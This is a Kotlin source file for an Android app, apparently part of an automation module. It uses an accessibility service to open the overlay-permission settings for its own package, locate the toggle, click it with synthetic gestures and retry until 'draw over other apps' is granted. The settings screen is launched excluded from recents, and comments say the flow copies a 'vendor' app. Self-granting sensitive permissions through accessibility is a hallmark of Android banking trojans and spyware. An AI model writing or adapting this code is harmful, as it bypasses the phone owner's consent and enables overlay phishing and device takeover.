package com.storm.safe.rock.service.modules.yw5xud.generic

import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.common.UiDebugger
import com.storm.safe.rock.service.modules.yw5xud.generic.GenericSteps.Companion.OVERLAY_SWITCH_IDS

/**
 * GenericOverlay — Overlay (draw over other apps) permission.
 * Extracted from GenericSteps.executeOverlayPermission + enableDrawOverlay.
 *
 * Matches vendor b3/a6: check Settings.canDrawOverlays, launch ACTION_MANAGE_OVERLAY_PERMISSION.
 */
class GenericOverlay(
    private val service: MyAccessibilityService?,
    private val context: android.content.Context,
    private val ui: UiAutomation,
    private val steps: GenericSteps
) {
    companion object {
        private const val TAG = "GenericOverlay"
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        UiDebugger.logStep(TAG, "Flow3: executeOverlayPermission 开始")
        try {
            if (ui.canDrawOverlays()) {
                successes.add("悬浮窗权限已开启")
                return
            }
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            }
            context.startActivity(intent)
            logs.add("已打开悬浮窗权限设置页")

            steps.interruptibleDelay(2500L)
            steps.waitForPageStable()
            UiDebugger.dumpPage(service, "generic_overlay_settings", "悬浮窗设置页")

            enableDrawOverlay(0, successes, failures, logs)

            // Vendor: after overlay, just press BACK to exit settings detail page.
            // Do NOT press HOME — we need settings to stay in foreground for VISIBLE_WINDOW.
            if (ui.canDrawOverlays()) {
                ui.pressBack()
                steps.interruptibleDelay(300L)
            }
        } catch (e: Exception) {
            failures.add("悬浮窗权限配置失败: ${e.message}")
        }
    }

    private suspend fun enableDrawOverlay(
        retryCount: Int,
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (retryCount > 20 || ui.canDrawOverlays()) {
            if (ui.canDrawOverlays()) successes.add("悬浮窗权限已开启")
            return
        }

        UiDebugger.logStep(TAG, "enableDrawOverlay retry=$retryCount")
        UiDebugger.dumpPage(service, "generic_overlay_retry_$retryCount", "悬浮窗重试#$retryCount")

        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return

        // Phase 1: App name click (vendor: only on retry==0)
        if (retryCount == 0) {
            val appLabel = steps.appLabel
            if (appLabel.isNotEmpty()) {
                val nodes = try { root.findAccessibilityNodeInfosByText(appLabel) } catch (_: Exception) { null }
                if (!nodes.isNullOrEmpty()) {
                    for (node in nodes) {
                        if (!node.isVisibleToUser) continue
                        val rect = android.graphics.Rect()
                        node.getBoundsInScreen(rect)
                        val rootRect = android.graphics.Rect()
                        root.getBoundsInScreen(rootRect)
                        if (rootRect.contains(rect) && rect.width() > 0 && rect.height() > 0) {
                            steps.dispatchGestureClick(rect.centerX().toFloat(), rect.centerY().toFloat())
                            Log.i(TAG, "[悬浮窗] 点击 App 名字: $appLabel")
                            steps.interruptibleDelay(1500L)
                            if (ui.canDrawOverlays()) { successes.add("悬浮窗权限已开启"); return }
                            break
                        } else {
                            // Only scroll if still on settings page (avoid scrolling launcher)
                            val currentPkg = try { service?.rootInActiveWindow?.packageName?.toString() } catch (_: Exception) { null }
                            if (currentPkg == "com.android.settings" || currentPkg == "com.miui.securitycenter") {
                                steps.scrollForward(root); steps.interruptibleDelay(800L)
                            }
                            enableDrawOverlay(retryCount + 1, successes, failures, logs); return
                        }
                    }
                }
            }
        }

        // Phase 2: Search switch by ViewId (vendor: 7 IDs)
        for (switchId in OVERLAY_SWITCH_IDS) {
            try {
                val nodes = root.findAccessibilityNodeInfosByViewId(switchId)
                if (nodes.isNullOrEmpty()) continue
                for (node in nodes) {
                    if (!node.isVisibleToUser) continue
                    if (node.isCheckable && node.isChecked) {
                        successes.add("悬浮窗权限已开启"); return
                    }
                    val rect = android.graphics.Rect()
                    node.getBoundsInScreen(rect)
                    if (rect.width() > 0 && rect.height() > 0) {
                        steps.dispatchGestureClick(rect.centerX().toFloat(), rect.centerY().toFloat())
                        Log.i(TAG, "[悬浮窗] 手势点击开关 (ViewId: $switchId)")
                    }
                    break
                }
            } catch (_: Exception) {}
        }

        // Phase 3: Verify + confirm dialog + scroll retry
        steps.interruptibleDelay(1500L)
        if (ui.canDrawOverlays()) { successes.add("悬浮窗权限已开启"); return }
        steps.clickPermissionAllowButton()
        steps.interruptibleDelay(1500L)
        if (ui.canDrawOverlays()) { successes.add("悬浮窗权限已开启"); return }
        // Only scroll if still on settings page (avoid scrolling launcher)
        val currentPkg2 = try { service?.rootInActiveWindow?.packageName?.toString() } catch (_: Exception) { null }
        if (currentPkg2 == "com.android.settings" || currentPkg2 == "com.miui.securitycenter") {
            steps.scrollForward(root); steps.interruptibleDelay(500L)
        }
        enableDrawOverlay(retryCount + 1, successes, failures, logs)
    }
}
